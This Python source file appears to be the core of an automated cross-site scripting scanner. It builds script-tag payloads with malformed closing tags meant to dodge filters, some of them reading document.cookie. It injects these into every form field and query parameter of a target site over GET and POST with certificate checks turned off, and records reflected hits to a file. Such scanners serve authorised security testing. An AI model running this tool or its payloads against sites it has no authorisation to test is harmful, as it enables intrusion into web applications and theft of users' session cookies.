from random import randint
from urllib.parse import parse_qs, urljoin, urlparse

from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from lib.helper.Log import *
from lib.helper.helper import *

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class core:

	@classmethod
	def generate(self, eff):
		FUNCTION = [
			"prompt(5000/200)",
			"alert(6000/3000)",
			"alert(document.cookie)",
			"prompt(document.cookie)",
			"console.log(5000/3000)",
		]
		if eff == 1:
			return r"<script/>" + FUNCTION[randint(0, 4)] + r"<\script\>"
		elif eff == 2:
			return r"<\script/>" + FUNCTION[randint(0, 4)] + r"<\script>"
		elif eff == 3:
			return r"<\script\> " + FUNCTION[randint(0, 4)] + r"<//script>"
		elif eff == 4:
			return r"<script>" + FUNCTION[randint(0, 4)] + r"<\script/>"
		elif eff == 5:
			return "<script>" + FUNCTION[randint(0, 4)] + "<//script>"
		return "<script>" + FUNCTION[randint(0, 4)] + "</script>"

	@classmethod
	def _write_finding(self, target_url):
		with open("xss.txt", "a", encoding="utf-8") as file:
			file.write(str(target_url) + "\n\n")

	@classmethod
	def post_method(self):
		bsObj = BeautifulSoup(self.body, "html.parser")
		forms = bsObj.find_all("form", method=True)

		for form in forms:
			action = form.get("action", self.url)
			if form.get("method", "").lower().strip() != "post":
				continue

			form_url = urljoin(self.url, action)
			Log.warning("Target have form with POST method: " + C + form_url)
			Log.info("Collecting form input key.....")

			keys = {}
			for key in form.find_all(["input", "textarea"]):
				name = key.get("name")
				if not name:
					continue

				value = name if key.get("type") == "submit" else self.payload
				Log.info("Form key name: " + G + name + N + " value: " + G + value)
				keys[name] = value

			if not keys:
				continue

			Log.info("Sending payload (POST) method...")
			try:
				req = self.session.post(form_url, data=keys, verify=False)
			except Exception as e:
				Log.info("Internal error: " + str(e))
				continue

			if self.payload in req.text:
				Log.high("Detected XSS (POST) at " + req.url)
				self._write_finding(req.url)
				Log.high("Post data: " + str(keys))
			else:
				Log.info("Parameter page using (POST) payloads but not 100% yet...")

	@classmethod
	def get_method_form(self):
		bsObj = BeautifulSoup(self.body, "html.parser")
		forms = bsObj.find_all("form", method=True)

		for form in forms:
			action = form.get("action", self.url)
			if form.get("method", "").lower().strip() != "get":
				continue

			form_url = urljoin(self.url, action)
			Log.warning("Target have form with GET method: " + C + form_url)
			Log.info("Collecting form input key.....")

			keys = {}
			for key in form.find_all(["input", "textarea"]):
				name = key.get("name")
				if not name:
					continue

				value = name if key.get("type") == "submit" else self.payload
				Log.info("Form key name: " + G + name + N + " value: " + G + value)
				keys[name] = value

			if not keys:
				continue

			Log.info("Sending payload (GET) method...")
			try:
				req = self.session.get(form_url, params=keys, verify=False)
			except Exception as e:
				Log.info("Internal error: " + str(e))
				continue

			if self.payload in req.text:
				Log.high("Detected XSS (GET) at " + req.url)
				self._write_finding(req.url)
				Log.high("GET data: " + str(keys))
			else:
				Log.info("Parameter page using (GET) payloads but not 100% yet...")

	@classmethod
	def get_method(self):
		bsObj = BeautifulSoup(self.body, "html.parser")
		links = bsObj.find_all("a", href=True)

		for anchor in links:
			raw_url = anchor["href"].strip()
			if raw_url.startswith(("mailto:", "tel:", "javascript:", "#")):
				Log.info("URL is not an HTTP url, ignoring")
				continue

			base = urljoin(self.url, raw_url)
			parsed = urlparse(base)
			if parsed.scheme not in ("http", "https") or not parsed.query:
				continue

			params = parse_qs(parsed.query, keep_blank_values=True)
			if not params:
				continue

			Log.warning("Found link with query: " + G + parsed.query + N + " Maybe a vuln XSS point")

			test_params = {key: self.payload for key in params}
			target_url = parsed._replace(query="").geturl()
			Log.info("Query (GET) : " + target_url + " -> " + str(test_params))

			try:
				response = self.session.get(target_url, params=test_params, verify=False)
			except Exception as e:
				Log.info("Internal error: " + str(e))
				continue

			if self.payload in response.text:
				Log.high("Detected XSS (GET) at " + response.url)
				self._write_finding(response.url)
			else:
				Log.info("Parameter page using (GET) payloads but not 100% yet...")

	@classmethod
	def main(self, url, proxy, headers, payloads, cookie, method=2):
		print(W + "*" * 15)
		self.url = url
		self.session = session(proxy, headers, cookie)
		Log.info("Checking connection to: " + Y + url)

		try:
			ctr = self.session.get(url, verify=False)
			self.body = ctr.text
		except Exception as e:
			Log.high("Internal error: " + str(e))
			return

		if ctr.status_code > 400:
			Log.info("Connection failed " + G + str(ctr.status_code))
			return

		Log.info("Connection estabilished " + G + str(ctr.status_code))

		for payload in payloads:
			self.payload = payload
			Log.info("Testing payload: " + G + payload)

			if method >= 2:
				self.post_method()
				self.get_method()
				self.get_method_form()
			elif method == 1:
				self.post_method()
			elif method == 0:
				self.get_method()
				self.get_method_form()
